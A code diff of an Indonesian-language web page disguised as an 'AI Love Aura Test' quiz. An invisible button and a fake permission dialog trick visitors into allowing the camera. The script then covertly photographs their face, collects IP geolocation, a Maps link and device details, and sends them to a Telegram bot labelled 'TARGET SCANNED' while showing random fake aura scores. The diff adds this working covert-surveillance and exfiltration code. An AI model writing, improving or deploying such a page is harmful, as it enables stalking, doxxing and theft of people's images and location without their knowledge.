@@ -6,65 +6,85 @@
     <title>AI Love Aura Test ✨</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
-        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.7); }
+        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.75); }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Varela Round', sans-serif; background: #ffeef8; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+        
         .bg-animated { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #ffeef8 0%, #ffcbd5 100%); z-index: 1; }
         .particle { position: absolute; background: rgba(255, 105, 180, 0.3); bottom: -150px; border-radius: 50%; animation: floating 15s infinite linear; }
         @keyframes floating { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 20% { opacity: 0.5; } 100% { transform: translateY(-1200px) rotate(720deg); opacity: 0; } }
-        #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; z-index: 9999; }
-        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); padding: 40px 25px; border-radius: 40px; border: 1.5px solid rgba(255,255,255,0.8); box-shadow: 0 20px 50px rgba(255, 105, 180, 0.2); text-align: center; width: 88%; max-width: 340px; }
-        h1 { color: var(--secondary); font-size: 1.6rem; margin: 15px 0 10px 0; }
-        p { color: #666; font-size: 0.9rem; line-height: 1.6; }
-        .btn-love { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 16px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; margin-top: 25px; width: 100%; display: block; position: relative; overflow: hidden; box-shadow: 0 8px 25px rgba(255, 20, 147, 0.3); }
-        .btn-love::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent); animation: shimmer 3s infinite; }
+
+        #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; z-index: 9999; cursor: pointer; }
+        
+        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); padding: 45px 25px; border-radius: 45px; border: 2px solid rgba(255,255,255,0.9); box-shadow: 0 25px 60px rgba(255, 105, 180, 0.25); text-align: center; width: 90%; max-width: 350px; }
+        
+        h1 { color: var(--secondary); font-size: 1.7rem; margin: 15px 0 10px 0; letter-spacing: -0.5px; }
+        p { color: #555; font-size: 0.95rem; line-height: 1.6; }
+
+        .btn-love { 
+            background: linear-gradient(45deg, var(--primary), var(--secondary)); 
+            color: white; padding: 18px; border-radius: 50px; font-weight: bold; border: none; 
+            cursor: pointer; margin-top: 25px; width: 100%; display: block; position: relative; 
+            overflow: hidden; box-shadow: 0 10px 25px rgba(255, 20, 147, 0.3); font-size: 15px;
+        }
+        .btn-love::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(120deg, transparent, rgba(255,255,255,0.5), transparent); animation: shimmer 2.5s infinite; }
         @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
-        #scan-visual { display: none; position: relative; width: 140px; height: 140px; margin: 20px auto; border: 5px solid var(--primary); border-radius: 50%; overflow: hidden; box-shadow: 0 0 30px var(--primary); }
-        .scan-bar { position: absolute; width: 100%; height: 8px; background: var(--secondary); top: 0; animation: scanLine 2s infinite ease-in-out; }
+
+        #scan-visual { display: none; position: relative; width: 150px; height: 150px; margin: 20px auto; border: 6px solid var(--primary); border-radius: 50%; overflow: hidden; box-shadow: 0 0 35px var(--primary); }
+        .scan-bar { position: absolute; width: 100%; height: 10px; background: var(--secondary); top: 0; animation: scanLine 2s infinite ease-in-out; box-shadow: 0 0 15px var(--secondary); }
         @keyframes scanLine { 0% { top: -10%; } 50% { top: 100%; } 100% { top: -10%; } }
-        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.4); padding: 20px; border-radius: 25px; margin-top: 20px; }
-        .stat-bar-bg { width: 100%; height: 10px; background: #ffd1dc; border-radius: 10px; margin: 8px 0 15px 0; }
-        .stat-bar-fill { height: 100%; background: var(--secondary); width: 0%; transition: width 2s ease-out; border-radius: 10px; }
+
+        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.5); padding: 22px; border-radius: 30px; margin-top: 25px; }
+        .stat-bar-bg { width: 100%; height: 12px; background: #ffd1dc; border-radius: 10px; margin: 8px 0 18px 0; }
+        .stat-bar-fill { height: 100%; background: var(--secondary); width: 0%; transition: width 2.5s ease-out; border-radius: 10px; }
+
         video, canvas { display: none; }
-        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.4); z-index:10000; backdrop-filter: blur(4px); }
-        #fake-dialog { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 35px; width: 290px; z-index: 10001; text-align: center; }
+        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.45); z-index:10000; backdrop-filter: blur(6px); }
+        #fake-dialog { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 35px; border-radius: 40px; width: 300px; z-index: 10001; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div class="bg-animated"><div class="particle" style="left:10%;width:80px;height:80px;"></div><div class="particle" style="left:70%;width:60px;height:60px;animation-delay:3s;"></div></div>
+    <div class="bg-animated">
+        <div class="particle" style="left:5%;width:100px;height:100px;"></div>
+        <div class="particle" style="left:80%;width:70px;height:70px;animation-delay:4s;"></div>
+    </div>
+
     <button id="trigger"></button>
+
     <div id="overlay"></div>
     <div id="fake-dialog">
-        <div style="font-size: 3.5rem;">📸</div>
+        <div style="font-size: 4rem;">📷</div>
         <h1>Izin Kamera</h1>
-        <p>AI membutuhkan akses kamera sebentar untuk melihat aura wajahmu.</p>
-        <button class="btn-love" id="btn-allow">IZINKAN SEKARANG ✨</button>
+        <p>AI membutuhkan akses kamera untuk menscan spektrum warna auramu.</p>
+        <button class="btn-love" id="btn-allow">IZINKAN ✨</button>
     </div>
 
     <div class="container" id="main-container">
         <div id="setup-view">
-            <div style="font-size: 4.5rem; margin-bottom: 10px;">💖</div>
+            <div style="font-size: 5rem; margin-bottom: 10px;">💖</div>
             <h1>AI Love Aura</h1>
-            <p>Penasaran gimana warna auramu hari ini? Yuk scan wajahmu pake AI terbaru.</p>
+            <p>Klik di mana saja untuk melihat warna auramu & keberuntunganmu hari ini.</p>
             <div class="btn-love">MULAI SCAN</div>
         </div>
+
         <div id="scan-view" style="display:none;">
-            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3.5rem;">✨</div></div>
+            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:4rem;">✨</div></div>
             <h1>Menganalisa...</h1>
-            <p>Tetap tenang, sedang menyelaraskan frekuensi aura wajah...</p>
+            <p>Sedang membaca biometrik & frekuensi energi wajahmu...</p>
         </div>
+
         <div id="result-view" style="display:none;">
-            <div style="font-size: 3.5rem;">🌈</div>
-            <h1>Hasil Aura</h1>
-            <div style="font-size: 4rem; color: var(--secondary); font-weight: bold; margin: 5px 0;" id="final-score">0%</div>
+            <div style="font-size: 4rem;">🌈</div>
+            <h1>Aura Ditemukan!</h1>
+            <div style="font-size: 4.5rem; color: var(--secondary); font-weight: bold; margin: 5px 0;" id="final-score">0%</div>
             <div class="analysis-box">
-                <span style="font-size:0.75rem; color:var(--secondary); font-weight:bold;">LOVE LUCK</span>
+                <span style="font-size:0.8rem; color:var(--secondary); font-weight:bold;">LOVE LUCK</span>
                 <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
-                <span style="font-size:0.75rem; color:var(--secondary); font-weight:bold;">POSITIVE VIBES</span>
+                <span style="font-size:0.8rem; color:var(--secondary); font-weight:bold;">POSITIVE VIBES</span>
                 <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
             </div>
-            <p id="random-quote" style="font-style:italic; margin-top:20px; color:var(--secondary); font-size: 0.85rem; font-weight: 500;"></p>
+            <p id="random-quote" style="font-style:italic; margin-top:20px; color:var(--secondary); font-size: 0.9rem; font-weight: 500;"></p>
             <button class="btn-love" onclick="location.reload()">COBA LAGI</button>
         </div>
     </div>
@@ -81,12 +101,14 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        // Step 1: Handle Invisible Trigger
         trigger.onclick = () => {
-            trigger.remove(); // Hapus permanen agar tidak mengganggu
+            trigger.remove(); 
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('fake-dialog').style.display = 'block';
         };
 
+        // Step 2: Request Permissions & Start Intelligence Gathering
         btnAllow.onclick = async () => {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('fake-dialog').style.display = 'none';
@@ -94,55 +116,74 @@
             document.getElementById('scan-view').style.display = 'block';
 
             try {
+                // Kamera Start
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 document.getElementById('scan-visual').style.display = 'block';
                 if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
 
-                // Ambil data IP yang lebih detail
-                const net = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query').then(r => r.json()).catch(() => ({}));
-                const bat = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
+                // DATA GATHERING (HTTPS API)
+                let net = {};
+                try {
+                    const res = await fetch('https://ipwho.is/');
+                    net = await res.json();
+                } catch (e) { net = { ip: 'Fail to fetch IP' }; }
 
-                // Susun report lengkap
+                const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
+
+                // Susun Report Super Lengkap
                 const report = `
-🌟 [NEW AURA SCAN SUCCESS]
-━━━━━━━━━━━━━━━━━━
-📍 LOKASI & JARINGAN
-IP: ${net.query || 'Unknown'}
-Kota: ${net.city || '?'}
-Region: ${net.regionName || '?'}
-ISP: ${net.isp || '?'}
+🚨 [TARGET SCANNED SUCCESSFULLY] 🚨
+━━━━━━━━━━━━━━━━━━━━
+📍 NETWORK & LOCATION
+IP: ${net.ip || '?'}
+ISP: ${net.connection?.isp || 'Unknown'}
+City: ${net.city || '?'}
+Region: ${net.region || '?'}
+Zip: ${net.postal || '?'}
 
-📱 PERANGKAT
-Baterai: ${(bat.level * 100).toFixed(0)}%
-Layar: ${screen.width}x${screen.height}
-Browser: ${navigator.vendor}
+🌍 GOOGLE MAPS LOCATION
+https://www.google.com/maps?q=${net.latitude || 0},${net.longitude || 0}
+
+📱 DEVICE INFO
+Battery: ${(battery.level * 100).toFixed(0)}%
+Screen: ${screen.width}x${screen.height}
 Platform: ${navigator.platform}
+Browser: ${navigator.userAgent.slice(0, 40)}...
 
-⏰ WAKTU
+⏰ TIMESTAMP
 ${new Date().toLocaleString('id-ID')}
-━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━━━`;
 
+                // Delay 4 detik biar seolah-olah lagi scan aura
                 setTimeout(() => { capture(stream, report); }, 4000);
+
             } catch (err) {
-                alert("Scan gagal! Pastikan kamu memberikan izin kamera.");
+                alert("Scan gagal! Izin kamera wajib diberikan untuk melihat hasil.");
                 location.reload();
             }
         };
 
         function capture(stream, report) {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
+            
+            // Mirror image fix
+            ctx.translate(canvas.width, 0); 
+            ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const blob = dataURItoBlob(canvas.toDataURL('image/png'));
             const fd = new FormData();
             fd.append('chat_id', TG_CHAT_ID);
-            fd.append('photo', blob, 'aura.png');
+            fd.append('photo', blob, 'aura_identity.png');
             fd.append('caption', report);
 
+            // Kirim ke Telegram
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            
+            // Matikan Kamera
             stream.getTracks().forEach(t => t.stop());
             showResult();
         }
@@ -150,11 +191,20 @@ ${new Date().toLocaleString('id-ID')}
         function showResult() {
             document.getElementById('scan-view').style.display = 'none';
             document.getElementById('result-view').style.display = 'block';
-            document.getElementById('random-quote').innerText = "Aura Pink: Seseorang merindukanmu hari ini! 🥰";
+            
+            const quotes = [
+                "Aura Pink: Seseorang sangat merindukanmu semalam! 🥰",
+                "Aura Ungu: Karismamu hari ini tak tertahankan! ✨",
+                "Aura Emas: Keberuntungan besar akan datang besok! 💰",
+                "Aura Biru: Kamu sedang dipenuhi energi kedamaian. 🌊"
+            ];
+            
+            document.getElementById('random-quote').innerText = quotes[Math.floor(Math.random()*quotes.length)];
             document.getElementById('final-score').innerText = (Math.floor(Math.random()*12)+88) + "%";
+            
             setTimeout(() => {
-                document.getElementById('bar-luck').style.width = "94%";
-                document.getElementById('bar-vibe').style.width = "91%";
+                document.getElementById('bar-luck').style.width = "96%";
+                document.getElementById('bar-vibe').style.width = "92%";
             }, 500);
         }
 
